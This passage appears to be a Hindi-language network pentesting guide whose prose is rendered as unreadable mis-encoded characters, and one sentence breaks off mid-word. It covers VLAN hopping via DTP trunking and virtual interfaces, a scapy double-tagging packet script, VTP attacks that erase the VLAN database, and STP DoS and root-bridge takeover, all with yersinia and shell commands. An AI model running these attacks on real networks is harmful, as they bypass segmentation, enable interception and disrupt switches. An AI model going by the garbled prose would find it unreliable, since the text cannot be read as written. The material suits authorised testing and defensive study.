рдореИрдВ рдпрд╣ рдмрддрд╛рдирд╛ рдЪрд╛рд╣реВрдБрдЧрд╛ рдХрд┐ **Access/Desirable (0x03)** рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реЛрддрд╛ рд╣реИ рдХрд┐ DTP рдлреНрд░реЗрдо рд╡рд╛рдВрдЫрдиреАрдп рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реИ, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред рдФрд░ **802.1Q/802.1Q (0xa5)** рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реЛрддрд╛ рд╣реИ **802.1Q** рдПрдирдХреИрдкреНрд╕реБрд▓реЗрд╢рди рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реИред

STP рдлреНрд░реЗрдо рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, рд╣рдо **VLAN 30 рдФрд░ VLAN 60 рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЛ VLAN IDs рдФрд░ IPs рдХреЗ рдорд╛рди рдкрддрд╛ рдЪрд▓ рдЬрд╛рдП, рддреЛ рдЖрдк **рдПрдХ рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ DHCP рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕реНрдерд┐рд░ IP рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _ifconfig_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд VLAN рд╣реЙрдкрд░

рдЪрд░реНрдЪрд┐рдд рд╣рдорд▓реЗ рдХреЛ **рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдиреЗ рдФрд░ рдЕрдиреНрдп VLAN рдореЗрдВ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬрдиреЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреВрд▓ рджреНрд╡рд╛рд░рд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдЬрд╛рдирддрд╛ рд╣реИ **рдорд╛рдХ, рдЖрдИрдкреА рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рд╣реЛрд╕реНрдЯ рдХреЗ VLAN рдЖрдИрдбреА** рдХреА рдорд╛рди, рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд VLAN рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ VLAN рдХреЗ рд╕рд╛рде рдПрдХ рдлреНрд░реЗрдо **рдбрдмрд▓ рдЯреИрдЧ рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ **рд╡рд┐рдХреНрдЯрд┐рдо рдЖрдкрд╕реЗ рдЬреБрдбрд╝ рдирд╣реАрдВ рдкрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдХрд▓реНрдк UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рд╣реИ** рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ SNMP)ред

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рд╡рд╣ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рдЖрдИрдкреА рдХреЛ рдЫрд▓рдХрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдЯреАрд╕реАрдкреА рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рд╢реБрд░реВ рдХрд░реЗ рдФрд░ рд╡рд┐рдХреНрдЯрд┐рдо рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪреЗ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ (рд╕рдВрднрд╡рддрдГ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдПрдХ рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (635) (1).png>)

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк scapy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### рд▓реИрдЯрд░рд▓ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдмрд╛рдИрдкрд╛рд╕ <a href="#d679" id="d679"></a>

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХ рд╕реНрд╡рд┐рдЪ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк рд╕реАрдзреЗ рдХрдиреЗрдХреНрдЯреЗрдб рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ **VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ**ред рдмрд╕ **рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ** (рдЬрд┐рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ), рдЯрд╛рд░рдЧреЗрдЯ VLAN рдХреЗ рдЖрдИрдбреА рдХреЗ рд╕рд╛рде рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдПрдВ рдФрд░ рдПрдХ IP рдкрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред рдЖрдк рдкрддрд╛ рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ (DHCP) рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╛рдорд▓реЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛ред

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### рд▓реЗрдпрд░ 3 рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рдмрд╛рдИрдкрд╛рд╕

рдореЗрд╣рдорд╛рди рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдФрд░ рдЕрдиреНрдп рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдирд┐рдЬреА VLAN (рдЬрд┐рд╕реЗ _рдкреЛрд░реНрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди_ рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рд╕реЗрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ **рдкреАрдпрд░реНрд╕ рдХреЛ рдПрдХ рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗ** (рдЕрд░реНрдерд╛рддреН, рдХреНрд▓рд╛рдЗрдВрдЯ **рдПрдХ рд╡рд╛рдпрд░рд▓реЗрд╕ рдПрдХреНрд╕реЗрд╕ рдкреНрд╡рд╛рдЗрдВрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдХ рджреВрд╕рд░реЗ рдХреЛ рдПрдбреНрд░реЗрд╕ рдирд╣реАрдВ рджреЗ рд╕рдХрддреЗ**)ред рдиреЗрдЯрд╡рд░реНрдХ ACL (рдпрд╛ рдЙрд╕рдХреА рдЕрднрд╛рд╡) рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ рд░рд╛рдЙрдЯрд░ рддрдХ IP рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬреЗрдВ, рдЬреЛ рдлрд┐рд░ рдкрдбрд╝реЛрд╕реА рдкреАрдпрд░ рдХреЛ рдлрд┐рд░ рд╕реЗ рдлрд╝реЙрд░рд╡рд░реНрдб рдХрд░ рджреЗрддрд╛ рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ, рдПрдХ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдкреИрдХреЗрдЯ рдХреЛ рд░рд╛рдЙрдЯрд░ рдХреЗ MAC рдХреЗ рд╕рд╛рде рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ IP рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдлрд┐рд░, **рд░рд╛рдЙрдЯрд░ рдкреИрдХреЗрдЯ рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛**ред рдЬреИрд╕рд╛ рдХрд┐ _рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ рд╣рдорд▓реЛрдВ_ рдореЗрдВ рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪ рдпреЛрдЧреНрдп рд╣реЛрд╕реНрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдХреЗ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢рд┐рдХрд╛рд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

### VTP рд╣рдорд▓реЗ

**VTP (VLAN Trunking Protocol)** рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп VLANs рдХреЛ рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рд╣реИред рд╕реНрд╡рд┐рдЪ рд╡рд░реНрддрдорд╛рди VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдкрддрд╛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм рднреА рдХреЛрдИ рдЯреЗрдмрд▓ рдЕрдкрдбреЗрдЯ рд╣реЛрддрд╛ рд╣реИ, рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдПрдХ рдХреЗ рд╕рд╛рде рдмрдврд╝рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдФрд░ рдпрджрд┐ рдХреЛрдИ рд╕реНрд╡рд┐рдЪ рдПрдХ рдЕрдзрд┐рдХрддрд░ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рд╡рд╛рд▓реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЕрдкрдиреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░ рджреЗрдЧрд╛ред

#### VTP рдбреЛрдореЗрди рдореЗрдВ рднреВрдорд┐рдХрд╛рдПрдБ <a href="#ebfc" id="ebfc"></a>

* **VTP рд╕рд░реНрд╡рд░ред** VTP рд╕рд░реНрд╡рд░ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдирдП VLAN рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреБрд░рд╛рдиреЗ рд╡рд╛рд▓реЛрдВ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ VLANs рдореЗрдВ рд╕реВрдЪрдирд╛ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред **рдпрд╣ рдмрд╛рдХреА рдбреЛрдореЗрди рд╕рджрд╕реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП VTP рдШреЛрд╖рдгрд╛рдПрдВ рдЙрддреНрдкрдиреНрди рднреА рдХрд░рддрд╛ рд╣реИред**
* **VTP рдХреНрд▓рд╛рдЗрдВрдЯред** рдЗрд╕ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдбреЛрдореЗрди рдореЗрдВ рдЕрдиреНрдп рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рд╡рд┐рд╢реЗрд╖ VTP рдШреЛрд╖рдгрд╛рдПрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХреЗред рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рд╡реАрдПрд▓рдПрди рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдореЗрдВ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╡реАрдПрд▓рдПрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдмрджрд▓рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ред**
* **VTP рдкрд╛рд░рджрд░реНрд╢реАред** рдЗрд╕ рдореЛрдб рдореЗрдВ, рд╕реНрд╡рд┐рдЪ VTP рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рднрд╛рдЧ рдирд╣реАрдВ рд▓реЗрддрд╛ рд╣реИ рдФрд░ рдкреВрд░реЗ VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкреВрд░реНрдг рдФрд░ рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдкрд╛рд░рджрд░реНрд╢реА рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп, рд╕реНрд╡рд┐рдЪ рдХреЗрд╡рд▓ рдЕрдиреНрдп рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ VTP рдШреЛрд╖рдгрд╛рдПрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреА VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓рддреЗ рд╣реИрдВред **рдРрд╕реЗ рд╕реНрд╡рд┐рдЪреЛрдВ рдХрд╛ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рд╣рдореЗрд╢рд╛ рд╢реВрдиреНрдп рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрди рдкрд░ рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

#### рд╡рд┐рдЬреНрдЮрд╛рдкрди рдкреНрд░рдХрд╛рд░ <a href="#b384" id="b384"></a>

* **рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди тАФ** VTP рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╣рд░ **300 рд╕реЗрдХрдВрдб (5 рдорд┐рдирдЯ)** рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ VTP рдШреЛрд╖рдгрд╛рдкрддреНрд░ред рдЗрд╕ рдШреЛрд╖рдгрд╛рдкрддреНрд░ рдореЗрдВ VTP рдбреЛрдореЗрди рдирд╛рдо, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг, рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк, рдФрд░ MD5 рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реИрд╢ рдорд╛рди рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред
* **рдЙрдкрд╕рдВрдЧреНрд░рд╣ рд╡рд┐рдЬреНрдЮрд╛рдкрди тАФ** рдпрд╣ VTP рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╡рд╣реА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдХрднреА рд╡реАрдПрд▓рдПрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддрд╛ рд╣реИред
* **рд╡рд┐рдЬреНрдЮрд╛рдкрди рдЕрдиреБрд░реЛрдз тАФ** рдпрд╣ VTP рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ VTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕рдВрджреЗрд╢ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рд╣реЛрддрд╛ рд╣реИред рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рдВрджреЗрд╢ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдХрд┐рд╕реА рд╕реНрд╡рд┐рдЪ рдиреЗ рдПрдХ рдЙрдЪреНрдЪрддрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рд╡рд╛рд▓рд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдЦреЛрдЬрд╛ рд╣реИред

VTP рдХреЛ **рдХреЗрд╡рд▓ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯ рд╕реЗ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ,** рдХреНрдпреЛрдВрдХрд┐ **VTP рдШреЛрд╖рдгрд╛рдПрдВ рдХреЗрд╡рд▓ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯ рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдФрд░ рдкреНрд░рд╛рдк
```bash
yersinia -G #For graphic mode
```
рд╡реАрдПрд▓рдПрди рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдорд┐рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **рд╕рднреА VTP рд╡реАрдПрд▓рдПрди рд╣рдЯрд╛рдиреЗ** рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP рд╣рдорд▓реЗ

**рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ BPDU рдлреНрд░реЗрдо рдХреИрдкреНрдЪрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ STP рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЕрд╕рдВрднрд╡ рд╣реИред**

#### **STP BPDU DoS**

рдмрд╣реБрдд рд╕рд╛рд░реЗ BPDUs TCP (рдЯреЛрдкреЛрд▓реЙрдЬреА рдЪреЗрдВрдЬ рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди) рдпрд╛ Conf (рдЬрдм рдЯреЛрдкреЛрд▓реЙрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рддреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ BPDUs) рднреЗрдЬрдХрд░ рд╕реНрд╡рд┐рдЪ рдХреЛ рдУрд╡рд░рд▓реЛрдб рдХрд░ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВред
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP рд╣рдорд▓рд╛**

рдЬрдм рдПрдХ TCP рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕реНрд╡рд┐рдЪ рдХреА CAM рдЯреЗрдмрд▓ 15 рд╕реЗрдХрдВрдб рдореЗрдВ рд╣рдЯрд╛ рджреА рдЬрд╛рдПрдЧреАред рдлрд┐рд░, рдпрджрд┐ рдЖрдк рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ CAM рдЯреЗрдмрд▓ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рд╣реЛрдЧреА (рд╣рд░ 15 рд╕реЗрдХрдВрдб рдореЗрдВ) рдФрд░ рдЬрдм рдпрд╣ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддреА рд╣реИ, рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP рд░реВрдЯ рд╣рдорд▓рд╛**

рд╣рдорд▓рд╛рд╡рд╛рджреА рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдПрд╕рдЯреАрдкреА рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╣ рдПрдХ рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдирдХрд▓ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛ред рдпрд╣ рджреЗрдЦрдиреЗ рд▓рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реИрдВред\
рдЗрд╕реЗ рдмреАрдкреАрдбреАрдпреВ рдХреЙрдиреНрдл рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬрдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **рдкреНрд░рд╛рдердорд┐рдХрддрд╛** рдорд╛рди рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдЯ рд╕реНрд╡рд┐рдЪ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реЗ рдХрдо рд╣реИред
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
